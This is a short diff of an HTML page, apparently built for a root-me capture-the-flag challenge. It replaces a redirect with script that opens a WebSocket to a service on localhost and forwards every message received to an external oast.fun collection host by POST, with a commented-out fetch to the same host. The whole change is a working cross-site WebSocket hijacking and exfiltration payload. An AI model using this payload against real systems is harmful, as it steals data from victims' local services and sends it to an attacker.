@@ -5,7 +5,20 @@
 </head>
 <body>
 <script>
-window.location = "http://ctf25.root-me.org/room";
+      //fetch('https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun/tst');
+        var ws = new WebSocket('ws://localhost/ws');
+
+        ws.onopen = function() {
+            ws.send("hello");
+        };
+
+        ws.onmessage = function(event) {
+            fetch('https://urebhcvlcfzusdpadjhirrwcq5hfanf83.oast.fun', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: event.data
+            });
+        };
 </script>
 
 </body>
